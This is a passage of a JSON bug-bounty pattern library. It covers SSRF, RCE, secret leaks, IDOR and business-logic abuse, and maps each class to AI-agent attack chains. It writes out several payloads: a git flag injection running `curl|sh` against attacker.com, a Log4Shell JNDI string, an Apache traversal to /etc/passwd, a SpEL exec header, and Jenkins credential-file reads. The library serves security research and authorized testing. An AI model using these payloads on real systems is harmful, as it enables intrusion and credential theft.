@@ -1,0 +1,667 @@
+{
+  "version": "1.0",
+  "provenance": "Claude-BugHunter:CC-BY-4.0+MIT",
+  "chains": [
+    {
+      "id": "hunt-ssrf",
+      "vuln_class": "ssrf",
+      "owasp_llm_mappings": [
+        "LLM01",
+        "LLM07"
+      ],
+      "atlas_id": "AML.T0040",
+      "ai_chain_description": "AI agent with URL-fetch tool \u2192 SSRF to cloud metadata/internal services",
+      "pattern_count": 7,
+      "patterns": [
+        {
+          "title": "Capital One SSRF \u2192 AWS IMDS \u2192 S3 exfil (2019)",
+          "source": "US Department of Justice court filings against Paige Thompson, 2019. Widely covered in mainstream technology press, AWS post-mortems, and cloud-security training material.",
+          "attack_shape": "A misconfigured web application firewall fronting a Capital One AWS workload permitted SSRF. The attacker reached the EC2 Instance Metadata Service (IMDSv1) at `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`, retrieved temporary IAM credentials for the instance role, and used those credentials to list and download S3 buckets containing ~100 million customer records.",
+          "key_trick": "No special protocol coercion was needed \u2014 the SSRF primitive accepted plain HTTP, and IMDSv1 did not require any header to release credentials. IMDSv2 (with token requirement via `X-aws-ec2-metadata-token`) was designed in response to this class.",
+          "significance": "Any SSRF on an AWS-hosted target must be tested against IMDSv1, IMDSv2 token-grab, the GCP metadata endpoint, and Azure IMDS variants. The blast radius of \"fetch arbitrary URL on the server\" is \"compromise the cloud role.\" Always."
+        },
+        {
+          "title": "PortSwigger SSRF research and Burp Collaborator workflow",
+          "source": "PortSwigger Research, body of work by James Kettle and others. Topics include the SSRF cheat sheet, blind SSRF via OOB techniques, and the integration of Collaborator into the Burp Suite scanning workflow. Searchable at portswigger.net/research; cite the program of research, not a specific URL.",
+          "attack_shape": "A general operator methodology \u2014 every URL-accepting parameter must be tested with a Collaborator subdomain because in-band signals (errors, status differences, response timing) are not sufficient to claim SSRF. The OOB callback (DNS + HTTP) is what separates SSRF from URL-echo.",
+          "key_trick": "Sub-tag the Collaborator subdomain per sink (`import.<collab>`, `webhook.<collab>`, `dlsrc.<collab>`) so a single listener can reveal *which* of the dozens of probed parameters fired.",
+          "significance": "The OOB discipline is the difference between credible SSRF reports and N/A submissions. It's the single most important methodology change for hunters moving from scanner-driven testing to operator-grade work."
+        },
+        {
+          "title": "Snyk SSRF \u2192 Git config injection \u2192 RCE chain",
+          "source": "Snyk Security Research blog, multiple posts in 2022-2024 covering the chain from a fetch-arbitrary-URL primitive to a remote-code-execution outcome via clones to attacker-controlled git URLs containing `--upload-pack=` or `--config=` flag-injection-via-URL. Search by topic \u2014 the class is publicly documented across Snyk write-ups and corresponding CVEs.",
+          "attack_shape": "A CI/CD or build-system endpoint accepts a \"repository URL\" parameter. The backend invokes `git clone <url>`. A specially crafted URL (e.g. `--upload-pack=curl example.com|sh https://attacker.com/repo.git`) causes `git` to interpret the leading dashes as command-line flags, reaching command execution as the build user.",
+          "key_trick": "This is SSRF in input *shape* \u2014 fetch-from-URL \u2014 but the protocol is `git`, not HTTP, and the dangerous primitive is git's own flag parsing, not the network fetch. Operators who only test HTTP-shaped SSRF miss this entirely.",
+          "significance": "\"SSRF\" is shorthand for \"server-initiated request influenced by attacker input.\" When the request tool is `git`, `curl`, `wget`, `ffmpeg`, `convert`, or `wkhtmltopdf`, the impact often exceeds plain network fetch \u2014 it reaches tool-specific code execution."
+        },
+        {
+          "title": "DNS rebinding as a TOCTOU SSRF (longstanding research)",
+          "source": "General class first documented in academic security literature decades ago; refreshed by NCC Group, Project Insecurity, and others. Searchable by topic.",
+          "attack_shape": "Server validates that a URL's hostname resolves to a public IP, then *re-resolves* the hostname when actually fetching. The attacker controls a DNS server that returns a public IP on the first lookup (passing validation) and `127.0.0.1` or `169.254.169.254` on the second lookup (the actual fetch).",
+          "key_trick": "Time-Of-Check / Time-Of-Use vulnerability in URL validators that perform DNS resolution. The defense is to resolve once, validate the resolved IP, and *fetch using the validated IP* (or pin to it via `Host:` header).",
+          "significance": "Any SSRF target with apparent IP-allowlist defense should be tested with a controlled DNS server (`rbndr.us` or custom). A passing allow-list check followed by a successful internal-IP fetch validates DNS rebinding as the primitive."
+        },
+        {
+          "title": "URL-fetching feature \u2192 SSRF (import / preview / attachment)",
+          "source": "SSRF via a project-import `remote_attachment_url` (<https://hackerone.com/reports/826361>, $10,000); full-read SSRF via a docs \"import as docs\" feature (<https://hackerone.com/reports/1409727>, $5,000); partially-blind SSRF via a chat `preview_url` endpoint reaching internal services (<https://hackerone.com/reports/1960765>, $6,000).",
+          "attack_shape": "A feature that fetches a user-supplied URL server-side \u2014 import-from-URL, link preview/unfurl, remote attachment, avatar-from-URL, webhook tester \u2014 is the SSRF workhorse. The server makes the request with its own network position, reaching internal hosts, cloud metadata, or link-local addresses.",
+          "key_trick": "Inventory every \"give us a URL and we'll fetch it\" feature. Test internal targets (`http://169.254.169.254/`, `http://localhost:<admin-port>`, internal hostnames) and blind exfil (Collaborator/OOB). Bypass allowlists with redirects, DNS rebinding, and alternate IP encodings.",
+          "significance": "Highest-frequency SSRF entry point; the import/preview class dominates disclosed SSRF."
+        },
+        {
+          "title": "SSRF \u2192 cloud metadata / internal control plane \u2192 infra compromise",
+          "source": "A critical SSRF via an analytics/reporting feature (<https://hackerone.com/reports/2262382>, $25,000); an SSRF that reached the metadata service and led to root access across containers in an infrastructure subset (<https://hackerone.com/reports/341876>).",
+          "attack_shape": "The SSRF reaches the cloud instance-metadata endpoint (`169.254.169.254/latest/meta-data/iam/security-credentials/`) and lifts IAM role credentials, or reaches an internal orchestration/admin API. Credentials \u2192 lateral movement \u2192 root/infra compromise.",
+          "key_trick": "Once any SSRF is confirmed, always try the metadata endpoint and internal service ports before reporting \u2014 the severity (and bounty) jumps an order of magnitude when it yields credentials. On IMDSv2, chain the `PUT` token step.",
+          "significance": "Turns a \"server made a request\" finding into full infrastructure takeover."
+        },
+        {
+          "title": "Protocol / proxy SSRF (TURN, gopher, non-HTTP)",
+          "source": "A TURN server permitted TCP/UDP proxying to the internal network and AWS metadata (<https://hackerone.com/reports/333419>, $3,500).",
+          "attack_shape": "A non-HTTP relay (TURN/STUN for WebRTC, an open proxy, a gopher/dict-capable fetcher) forwards attacker traffic to arbitrary internal hosts/ports \u2014 a broader SSRF than HTTP-only, reaching databases and metadata over raw TCP/UDP.",
+          "key_trick": "For real-time/media features, test whether the TURN/STUN relay accepts arbitrary peer addresses (internal IPs, metadata). For HTTP fetchers, probe `gopher://`/`dict://` to reach non-HTTP internal services.",
+          "significance": "Escapes the \"HTTP-only SSRF\" mental model; reaches services an HTTP fetch can't."
+        }
+      ],
+      "disclosed_report_count": 28,
+      "top_reports": [
+        {
+          "url": "https://hackerone.com/reports/2429894",
+          "bounty_usd": 4860
+        },
+        {
+          "url": "https://hackerone.com/reports/746024",
+          "bounty_usd": 4500
+        },
+        {
+          "url": "https://hackerone.com/reports/671935",
+          "bounty_usd": 4000
+        },
+        {
+          "url": "https://hackerone.com/reports/374737",
+          "bounty_usd": 3500
+        },
+        {
+          "url": "https://hackerone.com/reports/892049",
+          "bounty_usd": 3000
+        }
+      ],
+      "provenance": "Claude-BugHunter:CC-BY-4.0+MIT"
+    },
+    {
+      "id": "hunt-rce",
+      "vuln_class": "rce",
+      "owasp_llm_mappings": [
+        "LLM01",
+        "LLM04"
+      ],
+      "atlas_id": "AML.T0040",
+      "ai_chain_description": "AI agent with code-exec tool \u2192 RCE via deserialization/dependency confusion/shell injection",
+      "pattern_count": 10,
+      "patterns": [
+        {
+          "title": "Log4Shell (CVE-2021-44228)",
+          "source": "Apache Log4j 2 \u2014 disclosed December 2021. CVE-2021-44228. Massively documented across CISA advisories, vendor write-ups, and conference talks.",
+          "attack_shape": "Any string logged by an application running a vulnerable version of Log4j 2 was passed through JNDI lookup substitution. An attacker who could influence any logged string (`User-Agent`, `X-Forwarded-For`, a username field, a chat message, the subject of an HTTP request that produces an error log) could embed `${jndi:ldap://attacker.tld/x}` and the Java process would dereference the LDAP URL, fetch a remote class, and execute it.",
+          "key_trick": "The sink was not \"an endpoint that takes a URL\" \u2014 it was \"any log line.\" That moved the attack surface from a finite set of parameters to effectively *every* string the application logs, including ones the developer never thought of as user input.",
+          "significance": "This is the canonical demonstration that the *sink* in an RCE primitive isn't always a function called `eval`. Logging frameworks, format strings, template engines, ORM expression languages, and serialization libraries are all execution sinks in the right (wrong) configuration. Always ask: \"what library processes this string later?\""
+        },
+        {
+          "title": "Capital One SSRF\u2192IMDS credential exfiltration (2019)",
+          "source": "US Department of Justice charging documents and subsequent civil filings against Paige Thompson, 2019. Widely covered in mainstream technology press and used as a teaching case in cloud-security training.",
+          "attack_shape": "A web application firewall misconfiguration permitted SSRF against the EC2 Instance Metadata Service (IMDSv1) at `169.254.169.254`. The attacker retrieved temporary IAM credentials from the instance role and used those credentials to list and download S3 buckets containing roughly 100 million customer records.",
+          "key_trick": "This is SSRF\u2192privilege-escalation, not classical in-process RCE \u2014 but the operator lesson belongs in any RCE pattern library because the *practical impact* (full data exfil, infrastructure pivot) is RCE-equivalent. The privilege came from the metadata service, not from a memory-corruption primitive.",
+          "significance": "Cloud-hosted targets multiply the value of any \"fetch arbitrary URL\" primitive. IMDSv2 (with `X-aws-ec2-metadata-token`) mitigates this, but operators still find IMDSv1-only configurations and partial v2 enforcement. Always test the IMDS path on any SSRF candidate before deciding the bug is \"low impact.\""
+        },
+        {
+          "title": "Java deserialization via ysoserial gadgets",
+          "source": "Chris Frohoff and Gabriel Lawrence, AppSecCali 2015 talk \"Marshalling Pickles.\" Tool released on GitHub as `frohoff/ysoserial`. The research catalogue (Commons-Collections, Spring, Hibernate, JDK7u21, and many others) is publicly maintained.",
+          "attack_shape": "Any Java endpoint that accepts a serialized `java.io.Serializable` object (HTTP body, RMI, JMX, JNDI, T3 in WebLogic, IIOP, ViewState in ASP.NET-Java-bridges, message-queue payloads) and runs it through `ObjectInputStream.readObject()` without a class allowlist can be made to execute attacker-chosen `Runtime.exec` calls via a gadget chain \u2014 a sequence of methods invoked by the readObject machinery whose side effects culminate in code execution.",
+          "key_trick": "The vulnerability is not in `ObjectInputStream` itself; it is in the *combination* of `readObject` plus any vulnerable gadget on the classpath. Operators don't need to find a new gadget; they pick one from `ysoserial` matching the classpath dependencies (often inferred from response headers, error stack traces, or `WEB-INF/lib` enumeration).",
+          "significance": "This pattern persists fifteen years after the first paper because allow-listing is hard, fix is library-by-library, and many enterprise Java stacks (WebLogic, JBoss, WebSphere, custom Spring apps) still accept serialized blobs on some path. The same shape repeats in .NET (`BinaryFormatter`, `LosFormatter`, `NetDataContractSerializer`), Python (`pickle`), Ruby (`Marshal.load`), and PHP (`unserialize` and the phar:// stream wrapper)."
+        },
+        {
+          "title": "Microsoft SharePoint ToolShell precondition chain (CVE-2025-53770)",
+          "source": "Microsoft Security Response Center advisory and CISA Known Exploited Vulnerabilities catalogue, 2025. CVE-2025-53770.",
+          "attack_shape": "A SharePoint on-prem flaw allowing remote unauthenticated code execution against specific SharePoint Server versions when a chained set of preconditions is met. Exploited in the wild against on-premises SharePoint farms.",
+          "key_trick": "The exploitable state requires more than one configuration condition to align \u2014 operator value lies in checking the *precondition set* (versions, patch level, exposed endpoints, FormDigest behavior) rather than firing a generic payload at every `/_layouts/15/` path.",
+          "significance": "EoL or near-EoL enterprise products (SharePoint 2013/2016/2019) accumulate permanent CVE windows. Operators who fingerprint the version and check the precondition set against published CVE advisories will out-perform anyone running generic scanners. See `hunt-sharepoint` for the SharePoint-specific dispatcher."
+        },
+        {
+          "title": "Apache HTTP Server 2.4.49/2.4.50 alias-path traversal (CVE-2021-41773 / CVE-2021-42013)",
+          "source": "Apache HTTP Server security bulletin October 2021 (CVE-2021-41773); follow-up CVE-2021-42013 patched a partial-fix bypass days later. Both listed on CISA's Known Exploited Vulnerabilities catalogue. Still seen on internet-exposed servers years after disclosure because patching requires restarting `httpd`.",
+          "attack_shape": "Apache 2.4.49 (and 2.4.50 with a patch bypass) misnormalizes dot-encoded path segments inside configured alias paths. An attacker hits `/icons/.%2e/.%2e/.%2e/etc/passwd` and Apache traverses out of DocumentRoot into the filesystem. If the alias has `Options +ExecCGI` (default for `/cgi-bin/`), the same primitive becomes RCE by traversing to `/bin/sh` and POSTing the command in the body.",
+          "key_trick": "**Same primitive, different impact tier.** File read on `/icons/` is a Medium finding; the same path traversal on `/cgi-bin/` is Critical. Operators who stop at the first successful disclosure miss the upgrade. Always re-probe every configured alias.",
+          "significance": "Apache 2.4.49 is widespread on internet-exposed servers because patching requires a `httpd` restart and downtime windows. Verified by live exploit against `vulhub/httpd:CVE-2021-41773` \u2014 `/etc/passwd` disclosure and `id; uname -a` RCE confirmed. See `docs/verification/apache-cve-2021-41773.md`."
+        },
+        {
+          "title": "Spring Cloud Function SpEL injection (CVE-2022-22963)",
+          "source": "VMware Tanzu security advisory `cve-2022-22963`, March 2022. Spring Cloud Function \u2264 3.2.2 (and \u2264 3.1.6). The upstream commit `0e89ee27b2e76138c16bcba6f4bca906c4f3744f` ships the fix and explains the affected code path. Widely cited in vendor security bulletins and exploitation reports.",
+          "attack_shape": "The `spring.cloud.function.routing-expression` HTTP header on `/functionRouter` is evaluated as a SpEL expression before any routing logic or auth gate. Attacker sends a POST with this header set to `T(java.lang.Runtime).getRuntime().exec(...)` and runs arbitrary commands in the JVM process \u2014 usually root in containerized deployments.",
+          "key_trick": "Many SpEL-injection CVEs target POST body or URL params; this one is a header. Operators who scan only bodies/params will miss it. Use the `new String[]{\"cmd\",\"arg\"}` array form to avoid shell-quoting issues \u2014 `.exec(\"...\")` with quotes breaks the header value parser.",
+          "significance": "Spring Cloud Function deploys on AWS Lambda, GCP Cloud Run, and most on-prem function frameworks. The `/functionRouter` endpoint auto-registers \u2014 developers often expose it externally without realizing. Verified by live exploit against `vulhub/spring-cloud-function:3.2.2` \u2014 root command execution in 3 curl commands. See `docs/verification/spring-cve-2022-22963.md`."
+        },
+        {
+          "title": "Jenkins CLI args4j `@`-prefix file read (CVE-2024-23897)",
+          "source": "Jenkins Security Advisory 2024-01-24 and Atlassian-style reference write-ups by SonarSource and others. CVE-2024-23897. Added to CISA's Known Exploited Vulnerabilities catalogue in 2024.",
+          "attack_shape": "Java's `args4j` library defaults to `expandAtFiles=true`, which interprets any CLI argument beginning with `@` as a filename whose contents replace the argument with the file's lines (one line per arg). Jenkins exposes its CLI over HTTP at `/cli` and `/jnlpJars/jenkins-cli.jar`. The server-side argument-parsing error verbatim echoes failed arguments back, giving an unauthenticated arbitrary-file-read primitive. With anonymous read access enabled (the default on fresh installs), no auth is required.",
+          "key_trick": "`connect-node @/etc/passwd` returns *every line* of `/etc/passwd` in distinct \"No such agent\" error lines. The crown-jewel chain is `@/proc/self/environ` to locate `JENKINS_HOME`, then `@/var/jenkins_home/secret.key` + `@/var/jenkins_home/credentials.xml` to lift every stored credential the CI/CD server holds.",
+          "significance": "CI/CD servers concentrate every credential the org issues \u2014 AWS keys, kubeconfigs, SSH keys, source-repo tokens. A pre-auth file read on Jenkins is functionally equivalent to \"internal lateral movement on day zero.\" The pattern generalizes to any Java service that embeds args4j without `expandAtFiles=false` and exposes the CLI handler over HTTP. Verified by live exploit run against `vulhub/jenkins:2.441` \u2014 see `docs/verification/jenkins-cve-2024-23897.md`."
+        },
+        {
+          "title": "Dependency confusion \u2192 RCE in build / CI",
+          "source": "Development projects defaulting to the public NPM registry instead of the internal one, enabling dependency confusion (<https://hackerone.com/reports/925585>, $30,000).",
+          "attack_shape": "An internal package name is resolvable on a public registry (npm/PyPI/RubyGems). An attacker publishes a higher-version malicious package under that name; the victim's build/CI pulls it and executes install-time code \u2192 RCE in a privileged build context.",
+          "key_trick": "Harvest internal package names from leaked `package.json`/lockfiles/source maps (pairs with `hunt-source-leak`); check public-registry availability and scope claimability. Prove impact with a benign callback (`preinstall` \u2192 OOB), never a destructive payload.",
+          "significance": "Supply-chain RCE reaching CI secrets; top-tier bounty, low duplicate rate."
+        },
+        {
+          "title": "Archive / decompression / file-render RCE",
+          "source": "A decompressed-archive size-validator bypass (<https://hackerone.com/reports/1609965>, $33,510); a file-extension handling flaw in an upload proxy (<https://hackerone.com/reports/1154542>, $20,000); wiki-content rendering that invoked a command on certain extensions (<https://hackerone.com/reports/1125425>, $20,000).",
+          "attack_shape": "A server processes attacker-controlled files \u2014 extracting archives, rendering documents/wikis, transforming images \u2014 and an unsafe handler (a shell-out renderer, a vulnerable parser, an extension-to-processor map) executes code from the file's content or name.",
+          "key_trick": "Map every file-processing pipeline (upload \u2192 render/convert/extract). Test extensions that route to a code-capable processor (`.rmd`, `.svg`, office macros, `.tar` with traversal). Confirm execution with an OOB callback.",
+          "significance": "File-processing RCE is a dominant modern class; consistently $20k+."
+        },
+        {
+          "title": "Import / integration \u2192 command execution",
+          "source": "Remote command execution via a source-import (from-GitHub) feature (<https://hackerone.com/reports/1679624>, $33,510).",
+          "attack_shape": "An import/mirror/integration feature clones or fetches an attacker-controlled repository/URL and runs a build, hook, or interpreter over its contents (`.git/hooks`, CI config, a Makefile, a lockfile install script) \u2014 executing attacker code server-side.",
+          "key_trick": "Point import/mirror features at an attacker repo containing hooks/CI/build files; watch for server-side execution. Pairs with the dependency-confusion and archive vectors above.",
+          "significance": "Import features are a recurring RCE surface on dev/collaboration platforms."
+        }
+      ],
+      "disclosed_report_count": 82,
+      "top_reports": [
+        {
+          "url": "https://hackerone.com/reports/591295",
+          "bounty_usd": 20160
+        },
+        {
+          "url": "https://hackerone.com/reports/181879",
+          "bounty_usd": 18000
+        },
+        {
+          "url": "https://hackerone.com/reports/873614",
+          "bounty_usd": 15000
+        },
+        {
+          "url": "https://hackerone.com/reports/2177925",
+          "bounty_usd": 12500
+        },
+        {
+          "url": "https://hackerone.com/reports/658013",
+          "bounty_usd": 12000
+        }
+      ],
+      "provenance": "Claude-BugHunter:CC-BY-4.0+MIT"
+    },
+    {
+      "id": "hunt-source-leak",
+      "vuln_class": "source-leak",
+      "owasp_llm_mappings": [
+        "LLM02",
+        "LLM07"
+      ],
+      "atlas_id": "AML.T0024",
+      "ai_chain_description": "System prompt / config extraction via source disclosure primitives",
+      "pattern_count": 4,
+      "patterns": [
+        {
+          "title": "VCS / SaaS access token committed to a public artifact",
+          "source": "Disclosed across many programs \u2014 e.g. a valid GitHub access token with read/write to private org repos found inside a shipped desktop app (<https://hackerone.com/reports/1087489>, $50,000); a personal access token left in public CI build logs (<https://hackerone.com/reports/215625>); a token leaked on a third-party VCS granting private-repo access (<https://hackerone.com/reports/1266188>); a Jira API token committed to a public GitHub repo (<https://hackerone.com/reports/1785145>).",
+          "attack_shape": "A long-lived credential (GitHub PAT/OAuth token, Jira/SaaS API token) is committed to \u2014 or embedded in \u2014 a publicly reachable artifact: a source repo, a shipped binary/app bundle, or CI build logs. The token itself carries broad scope (repo read/write, admin API), so possession = access regardless of the app's own auth.",
+          "key_trick": "The leak is rarely in the target's own repo \u2014 check adjacent surfaces the developer forgot were public: a mobile/desktop app bundle, a personal fork, a third-party mirror (Bitbucket/GitLab), CI logs, and old commits (`git log -p`, trufflehog over full history). Validate scope with a read-only call (`GET /user`, `GET /rest/api/2/myself`) before reporting \u2014 never mutate.",
+          "significance": "One committed token collapses the entire \"the app is well-authenticated\" story. Highest-severity source-leak class; frequently Critical with four-to-five-figure bounties."
+        },
+        {
+          "title": "API key shipped in client JS without service-side restriction",
+          "source": "A Google Maps API key embedded in a public `index.js`, intentionally client-side but lacking HTTP-referer / API restrictions, enabling paid-service abuse (<https://hackerone.com/reports/3250315>).",
+          "attack_shape": "A key that is *public-by-design* (maps, analytics, a Firebase config) is shipped in client JS but not scoped \u2014 no referer/origin allowlist, no per-API restriction, no quota cap. An attacker lifts it from the bundle and bills the target's account or reaches unintended APIs under it.",
+          "key_trick": "\"It's a public key\" is not a triage-killer. The finding is the *missing restriction*, not the presence of the key. Demonstrate impact: call a billable/restricted API from an unlisted origin and show it succeeds. A key that is correctly referer-locked is not a bug.",
+          "significance": "Separates public-by-design SPA identifiers (info) from real cost/data exposure (payable). The distinction is exactly what triage teams reward for getting right."
+        },
+        {
+          "title": "Over-serialization leaking embedded secrets",
+          "source": "An endpoint that serialized a full Project model returned the CI Runner token (encrypted and unencrypted) to a caller without access to that project (<https://hackerone.com/reports/509924>, $12,000).",
+          "attack_shape": "An API serializes an entire ORM object and returns it, exposing attributes the caller should never see \u2014 internal tokens, secret keys, `password_digest`, provisioning credentials \u2014 because the serializer emits all model fields instead of an allowlist. Often reachable by referencing an object the caller doesn't own (IDOR + over-serialization chain).",
+          "key_trick": "Diff the JSON of an object you *do* own against one you shouldn't; grep every API response for `token`, `secret`, `key`, `_digest`. The secret is frequently already in a response you looked at \u2014 just below the fold of the fields the UI renders.",
+          "significance": "Chains cleanly to infra compromise (a Runner/deploy token \u2192 pipeline RCE). Pairs with `hunt-idor` when the over-serialized object is cross-tenant."
+        },
+        {
+          "title": "Live secrets in exposed logs / debug / forgotten test endpoints",
+          "source": "A test endpoint exposing application logs and live bearer tokens (<https://hackerone.com/reports/2844797>).",
+          "attack_shape": "A forgotten debug/log/test endpoint (matching this skill's Phase 5) serves application logs, verbose stack traces, or request dumps that contain live bearer tokens, session cookies, or internal API keys \u2014 the artifact is the *log*, not the code, but it leaks the same secrets.",
+          "key_trick": "After the Phase-1/5 forgotten-files sweep, actually *read* what the debug/log endpoint returns \u2014 grep the body for `Authorization:`, `Bearer `, `token`, `set-cookie`. A verbose log is only Info until you find a live credential in it, then it's Critical.",
+          "significance": "Closes the loop between artifact discovery (the skill's methodology) and secret capture. Pairs with `hunt-exceptional-conditions` when the log is triggered by forcing an error."
+        }
+      ],
+      "disclosed_report_count": 0,
+      "top_reports": [],
+      "provenance": "Claude-BugHunter:CC-BY-4.0+MIT"
+    },
+    {
+      "id": "hunt-idor",
+      "vuln_class": "idor",
+      "owasp_llm_mappings": [
+        "LLM06"
+      ],
+      "atlas_id": "AML.T0040",
+      "ai_chain_description": "AI agent accessing other users' resources via manipulated object references",
+      "pattern_count": 4,
+      "patterns": [
+        {
+          "title": "Numeric sequential ID IDOR (industry-wide class)",
+          "source": "A class of bugs disclosed against many HackerOne programs over more than a decade. Cite the *class* \u2014 operator-known and discussed in OWASP guidance, the OWASP API Security Top 10 (where it is BOLA / Broken Object Level Authorization), and conference talks at AppSecUSA / DEF CON over multiple years.",
+          "attack_shape": "Application exposes an object via a numerically incrementing identifier (`/api/orders/12345`, `/invoices/87432.pdf`, `/messages/9821`). Access control is checked at the route level (\"must be authenticated\") but not at the object level (\"user must own object 12345\"). Incrementing or guessing the ID returns another user's object.",
+          "key_trick": "The fix is *always* \"add an ownership check at the resolver.\" The bug recurs because the default ORM query (`Order.find(params[:id])`) returns by primary key, and the developer forgets to scope by `current_user`.",
+          "significance": "This is still the most common IDOR pattern. Operators should never accept \"but the ID is random\" as a defense \u2014 randomness only raises the cost of enumeration, not the existence of the bug."
+        },
+        {
+          "title": "GraphQL `node()` resolver IDOR (industry pattern)",
+          "source": "GraphQL Relay specification implementations across many programs. Discussed in HackerOne disclosed reports against multiple major SaaS programs and in conference talks on GraphQL security.",
+          "attack_shape": "Relay-style GraphQL APIs expose a global `node(id: ID!)` resolver that takes a base64-encoded global ID and returns the matching object. The decoded ID has the shape `TypeName:numeric_id` (e.g., `T3JkZXI6MTIzNDU=` decodes to `Order:12345`). The route-level auth applies, but the resolver does not scope by viewer.",
+          "key_trick": "Even if the application's normal API enforces ownership through other resolvers (`viewer.orders`), the `node()` resolver is a backdoor that returns any object of any type by global ID.",
+          "significance": "Operators auditing GraphQL targets must always probe `node()` (and its plural form `nodes()`) with cross-tenant IDs before declaring the schema safe."
+        },
+        {
+          "title": "Mass-assignment as authorization bypass",
+          "source": "OWASP API Security Top 10 (API3: Excessive Data Exposure / API6: Mass Assignment, depending on version). Documented in many disclosed reports and Rails / Django security advisories over a decade.",
+          "attack_shape": "Application accepts a JSON body on a profile / settings / account endpoint and merges it into the user object. The expected fields are `name`, `email`. The attacker adds `role: \"admin\"`, `is_verified: true`, `email_verified_at: \"2024-01-01\"`, `owner_id: <victim>`. Server applies all fields blindly.",
+          "key_trick": "This is an IDOR variant where the \"object\" being illegitimately modified is the *attacker's own* user record, but the modification crosses an authorization boundary (role, verification state, organization membership).",
+          "significance": "Sits at the boundary of IDOR and API misconfig. Pays because the chain reaches privilege escalation in one request."
+        },
+        {
+          "title": "UUID guess via timestamp-based UUIDv1",
+          "source": "RFC 4122 documents UUID structure publicly; CVE-2025 disclosures and several bug-bounty write-ups have documented UUIDv1's timestamp-leakage property. Cite RFC 4122 and the class.",
+          "attack_shape": "Target uses `UUIDv1` (timestamp + MAC-derived node ID). The first 60 bits encode the generation time at 100ns resolution; the node ID is often stable across the application's hosts. An attacker who can observe a few legitimate UUIDs can narrow the timestamp window of unseen UUIDs and brute-force them with a manageable search space.",
+          "key_trick": "\"UUID\" is not synonymous with \"random.\" UUIDv1, v2, and even some custom \"UUID-like\" schemes leak structural information. Only v4 (random) and v7 (timestamp + random tail) are safe-by-default, and v7 still leaks creation time.",
+          "significance": "Operators inheriting a target where IDs \"look random\" should always decode a few UUIDs and check the version nibble before deciding enumeration is infeasible."
+        }
+      ],
+      "disclosed_report_count": 33,
+      "top_reports": [
+        {
+          "url": "https://hackerone.com/reports/767770",
+          "bounty_usd": 20000
+        },
+        {
+          "url": "https://hackerone.com/reports/1145428",
+          "bounty_usd": 5750
+        },
+        {
+          "url": "https://hackerone.com/reports/1658418",
+          "bounty_usd": 5000
+        },
+        {
+          "url": "https://hackerone.com/reports/1966006",
+          "bounty_usd": 3000
+        },
+        {
+          "url": "https://hackerone.com/reports/1250037",
+          "bounty_usd": 3000
+        }
+      ],
+      "provenance": "Claude-BugHunter:CC-BY-4.0+MIT"
+    },
+    {
+      "id": "hunt-business-logic",
+      "vuln_class": "business-logic",
+      "owasp_llm_mappings": [
+        "LLM01",
+        "LLM06",
+        "LLM09"
+      ],
+      "atlas_id": "AML.T0040",
+      "ai_chain_description": "Agentic workflow abuse: multi-step chains that bypass business rules",
+      "pattern_count": 7,
+      "patterns": [
+        {
+          "title": "OWASP API Security Top 10 \u2014 API6:2023 \"Unrestricted Access to Sensitive Business Flows\"",
+          "source": "OWASP API Security Top 10, 2023 edition. Authoritative reference at owasp.org/API-Security. Specifically API6 covers business-flow abuse: bulk-purchase scalping, mass account creation, scraping, comment spam, and other patterns where each individual request is valid but the *aggregate* is the abuse.",
+          "attack_shape": "A flow that is legitimate at the single-request scale becomes a business problem at the 1,000\u00d7 scale. Defenses are typically rate-limit, captcha, or proof-of-work \u2014 when any of these are missing or bypassable, the flow is exploitable.",
+          "key_trick": "Identify which flows the business *cares* about being slow. Account creation, OTP send, password reset, checkout, reservation booking. For each, what would 1,000 parallel executions cost or distort? That dollar figure is the bug's impact.",
+          "significance": "OWASP's normative framing converts \"I can spam this endpoint\" from a low-severity rate-limit observation into a categorized business-flow abuse with quantified impact. Cite this category in reports."
+        },
+        {
+          "title": "Capital One 2019 breach \u2014 business-logic-adjacent SSRF chain",
+          "source": "DOJ indictment of Paige Thompson (July 2019), Capital One disclosures, OCC's $80M fine order (August 2020). Intrusion combined a misconfigured WAF allowing SSRF with overly-broad IAM permissions. Verifiable via the indictment, OCC consent order, and Capital One's 8-K.",
+          "attack_shape": "Technical primitive was SSRF; the business-logic dimension was an IAM role with `s3:ListAllMyBuckets` and `s3:Get*` on data that should have required additional authorization. The IAM design assumed anyone reaching the metadata service was trusted enough \u2014 an assumption that failed when SSRF arrived.",
+          "key_trick": "Cloud IAM is business logic encoded in policy. When IAM trusts the network perimeter, an SSRF becomes data exfil.",
+          "significance": "Treat the IAM role attached to a front-end web server as a business-policy artifact, not infrastructure."
+        },
+        {
+          "title": "Coupon / promo abuse class \u2014 e-commerce industry pattern",
+          "source": "Widely-discussed class across e-commerce bug-bounty programs (Shopify, BigCommerce, Walmart, Target). Featured in HackerOne hacktivity disclosures and in OWASP's business-flow-abuse documentation. Cite the class \u2014 specific reports vary by program.",
+          "attack_shape": "Coupons designed to be mutually exclusive (`SUMMER20`, `FIRSTORDER`, `LOYAL10`) are stackable when the validation logic checks each coupon independently rather than enforcing \"one coupon per order\" at checkout finalization. Alternatively, a coupon limited to \"one use per account\" is reusable across new accounts created at low cost.",
+          "key_trick": "Race-condition the coupon application or send all coupons in a single multi-coupon body the validator wasn't designed to receive. Stacking pays direct dollars per execution.",
+          "significance": "Direct financial loss to the merchant per execution, infinitely repeatable until detected. Pays predictably on e-commerce programs."
+        },
+        {
+          "title": "Robinhood \"infinite money glitch\" (November 2019)",
+          "source": "Publicly documented bug where Robinhood permitted users to leverage borrowed margin to buy more securities than equity supported. Coverage at Bloomberg, CNBC, and SEC filings.",
+          "attack_shape": "Margin calculations didn't account for in-flight option premiums correctly. Users wrote covered calls whose premium credited as buying power, used to buy more shares that became collateral for more covered calls. Each operation valid; composition violated risk policy.",
+          "key_trick": "Financial state machines with multiple in-flight settlements are rich attack surface. Anywhere money is \"in transit\" is a candidate for double-counting.",
+          "significance": "Settlement-timing double-counting recurs in any platform with margin, lending, staking, or escrow."
+        },
+        {
+          "title": "Payment state-machine abuse \u2192 funds without payment",
+          "source": "A double payout via mishandled payment-provider transaction states \u2014 withdraw money without the funds being deducted (<https://hackerone.com/reports/307239>, $10,000); modifying in-flight data to a payment provider to generate wallet balance (<https://hackerone.com/reports/1295844>, $7,500).",
+          "attack_shape": "The app's payment state machine trusts a provider callback or client-supplied transaction state. By replaying, racing, or tampering the intermediate state (pending\u2192completed, refund+capture, in-flight amount/currency), the attacker gets goods/balance without a matching charge.",
